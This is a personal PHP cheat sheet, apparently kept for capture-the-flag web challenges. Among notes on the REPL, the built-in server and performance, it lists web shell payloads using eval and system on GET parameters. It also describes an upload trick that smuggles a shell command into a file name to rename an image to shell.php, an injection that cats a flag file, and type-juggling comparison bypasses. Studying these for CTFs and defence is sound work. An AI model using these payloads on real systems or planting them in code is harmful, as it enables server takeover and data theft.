# +

- https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur
- https://www.arneswinnen.net/2013/11/hack-lu-2013-ctf-wannabe-writeup-part-one-web-exploitation/
- http://php.net/manual/en/wrappers.php

```html
<script language=PHP>eval($_GET['q']);</script>
<?php print_r(scandir('/')) ?>
```

```html
<?php echo system($_GET['s']); ?>
```
    > uploaded as shell.png, then uploaded another file: ´cd uploads;cd 6a9btoq20khkn8ln5lfhuo6v62;cp 65-shell.png shell.php´.png

```
flag','..')+or+system('cat+templates/flag.php');//
```

# repl

```bash
php -a
```

- [GitHub \- apinstein/iphp: An interactive php shell \(REPL\) with support for readline, autocomplete, include/require, and fatal\-error tolerance\.](https://github.com/apinstein/iphp)

# server

```bash
php -S localhost:8000
```

# performance 

- https://news.ycombinator.com/item?id=2615183
    > As someone who optimized a piece of PHP code recently, there are a number of things I ran into that were counterintuitive wrt performance.
    > - array_key_exists is 5X slower than isset (though there are different semantics)
    > - direct string concatenation is 2X faster than using "implode"
    > - memoization can be a huge win since function calls are 5X slower than array accesses. (No inlining in PHP)
    >
    > Of course, these optimizations don't matter except in your hotspots. (Why we still have to have this disclaimer on HN puzzles me, but people seem to keep trotting out the usual Knuth quote out of context as a way to write off micro-optimization techniques in general.)
    > Also important to keep in mind:
    > - PHP has copy on write semantics for arrays. So if you set $foo = $bar (arrays), you don't incur any additional memory until you alter $foo. (Aside from the additional reference.) Once you change any entry of $foo, PHP makes a copy of the whole thing. (This can result in massive performance and memory bloat if you don't realize its happening.)
    > - PHP arrays are not arrays, but are a hybrid linear array and hashtable. ("one data structure to rule them all.") So, even a simple "array" of integers incurs more than what you'd expect memory wise. In fact, IIRC, an array of integers incurs approximately 100 bytes of memory for each entry. Ouch. There are extensions in new versions of PHP that allow you to use 'real' arrays. If you're stuck using normal PHP arrays, good luck trying to design optimized data structures for the problem at hand.
    > 
    > See also: http://phpbench.com/

# type juggling, weak comparison, magic hashes

```php
<?php
strcmp($_GET['user'], "admin") == 0
// => "admin1"

strcasecmp($_GET['secret'], "0x1337") == 0
// => ["1"]
```

# deserialization

- https://dpalbd.wordpress.com/ctf-writeup-serial-1/
- https://www.netsparker.com/blog/web-security/untrusted-data-unserialize-php/
- https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf
- [GitHub \- galdeleon/35c3\_php: Solution for 35c3 php challenge](https://github.com/galdeleon/35c3_php)
    - ~/code/snippets/ctf/web/35c3_php/

# jail

- [GitHub \- splitline/PHPFuck: PHPFuck: \(\(\+\.^\)\) / Using only 7 different characters to write and execute php\.](https://github.com/splitline/PHPFuck)
- https://github.com/terjanq/Flag-Capture/blob/master/MeePwn%202018/omega/README.md#part2
- https://gist.github.com/terjanq/aa39a5a40b8d9b8a8e2a54e747715a2c
    - https://twitter.com/terjanq/status/1257276298550001664
